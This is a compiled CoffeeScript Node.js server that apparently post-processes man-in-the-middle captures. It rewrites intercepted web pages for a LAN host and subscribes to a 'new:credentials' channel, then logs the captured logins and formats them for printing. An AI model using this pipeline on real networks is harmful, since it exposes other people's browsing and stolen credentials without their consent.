// Generated by CoffeeScript 1.6.3
var Blacklist, Handlebars, PageTransformer, Templates, app, cheerio, express, fs, hbTemplates, http, incSequenceNumber, io, precompileTemplates, redis, redisClient, redisClient2, sequenceNumber, server, subterfuge_css_loc, subterfuge_image_loc;

subterfuge_image_loc = 'http://192.168.178.113:4000/static/images/';

subterfuge_css_loc = 'http://192.168.178.113:4000/static/css/';

express = require('express');

redis = require('redis');

cheerio = require('cheerio');

Handlebars = require('handlebars');

Blacklist = require('./blacklist');

fs = require('fs');

http = require('http');

app = express();

server = require('http').createServer(app);

io = require('socket.io').listen(server);

redisClient = redis.createClient(6379, "127.0.0.1");

redisClient2 = redis.createClient(6379, "127.0.0.1");

redisClient.on('error', function(err) {
  return console.log("REDIS ERROR: " + err);
});

server.listen(3000);

app.configure(function() {
  return app.use(express["static"](__dirname + '/public'));
});

Templates = {};

hbTemplates = {
  'cover': 'cover.html',
  'credentials': 'credentials.html'
};

precompileTemplates = function() {
  var name, path, _results;
  _results = [];
  for (name in hbTemplates) {
    path = hbTemplates[name];
    _results.push((function(name) {
      return fs.readFile(__dirname + '/views/' + path, 'utf8', function(err, data) {
        if (err) {
          throw err;
        }
        return Templates[name] = Handlebars.compile(data);
      });
    })(name));
  }
  return _results;
};

precompileTemplates();

sequenceNumber = fs.readFileSync(__dirname + '/seqnum', {
  encoding: 'utf-8'
});

sequenceNumber = sequenceNumber ? parseInt(sequenceNumber) : 0;

incSequenceNumber = function() {
  sequenceNumber++;
  fs.writeFile(__dirname + '/seqnum', sequenceNumber);
  return sequenceNumber;
};

io.sockets.on('connection', function(socket) {
  socket.on('ping', function() {
    return socket.emit('ready');
  });
  return socket.on('scrape', function(data) {
    var pageTransformer;
    data = JSON.parse(data);
    pageTransformer = new PageTransformer(data.page, data.host, data.fullUrl, data.encoding);
    return pageTransformer.run();
  });
});

redisClient.subscribe('new:credentials');

redisClient.on('message', function(channel, message) {
  var credentialsObj;
  if (channel === 'new:credentials') {
    credentialsObj = JSON.parse(message);
    console.log('Got credentials %o', credentialsObj);
    if (credentialsObj) {
      credentialsObj.sequenceNumber = incSequenceNumber();
      return redisClient2.publish('new:printable:credentials_' + credentialsObj.date, Templates.credentials(credentialsObj));
    }
  }
});

PageTransformer = (function() {
  function PageTransformer(data, host, fullUrl, encoding) {
    this.host = host;
    this.fullUrl = fullUrl;
    this.encoding = encoding;
    this.html = '<!DOCTYPE html><html>' + data + '</html>';
    this.$ = cheerio.load(this.html);
    this.timestamp = new Date().getTime();
  }

  PageTransformer.prototype.run = function() {
    if (!Blacklist["do"](this)) {
      this.getConnectionInfos();
      this.removeScripts();
      this.changeImageSources();
      this.changeCSSSources();
      return this.save();
    }
  };

  PageTransformer.prototype.removeScripts = function() {
    return this.$('script').remove();
  };

  PageTransformer.prototype.substituteSlashes = function(selector, attrName, new_path) {
    var $, that;
    $ = this.$;
    that = this;
    return $(selector).each(function() {
      var attr, newHost, re;
      attr = $(this).attr(attrName);
      newHost = '';
      if (attr) {
        if (attr.indexOf('http://') !== 0) {
          newHost = that.host + (attr.indexOf('/') === 0 ? '' : '/') + attr;
        } else {
          newHost = attr.replace('http://', '');
        }
        re = new RegExp('/', 'g');
        newHost = new_path + newHost.replace(re, '_');
        return $(this).attr(attrName, newHost);
      }
    });
  };

  PageTransformer.prototype.changeImageSources = function() {
    return this.substituteSlashes('img', 'src', subterfuge_image_loc);
  };

  PageTransformer.prototype.changeCSSSources = function() {
    return this.substituteSlashes('link[rel=stylesheet]', 'href', subterfuge_css_loc);
  };

  PageTransformer.prototype.getFaviconSrc = function(cb) {
    var checkAndContinue, i, opts, possibleExtensions,
      _this = this;
    possibleExtensions = ['ico', 'png', 'gif', 'jpg', 'jpeg'];
    i = -1;
    opts = {
      hostname: this.host,
      port: 80,
      path: '/favicon.',
      method: 'HEAD'
    };
    checkAndContinue = function() {
      var req;
      i++;
      if (i <= possibleExtensions.length) {
        opts.path += possibleExtensions[i];
        req = http.request(opts, function(res) {
          if (res.statusCode < 400 && res.statusCode >= 200) {
            return cb(opts.hostname + opts.path);
          } else {
            return checkAndContinue();
          }
        });
        return req.end();
      } else {
        return cb(null);
      }
    };
    return checkAndContinue();
  };

  PageTransformer.prototype.getConnectionInfos = function() {
    var $, connInfo, jsonTag;
    $ = this.$;
    jsonTag = $('#mitm-scraper-conn-info');
    if (jsonTag.length) {
      connInfo = JSON.parse(jsonTag.html());
      if (connInfo) {
        connInfo.sequenceNumber = incSequenceNumber();
        return this.getFaviconSrc(function(src) {
          connInfo.faviconSrc = src;
          this.coverHtml = Templates.cover(connInfo);
          return redisClient2.publish('new:printable:' + this.timestamp + '_cover', this.coverHtml, redis.print);
        });
      }
    }
  };

  PageTransformer.prototype.save = function() {
    var publishName;
    publishName = 'new:printable:' + this.timestamp + (this.encoding ? '#' + this.encoding : '');
    return redisClient2.publish(publishName, this.$.html(), redis.print);
  };

  return PageTransformer;

})();
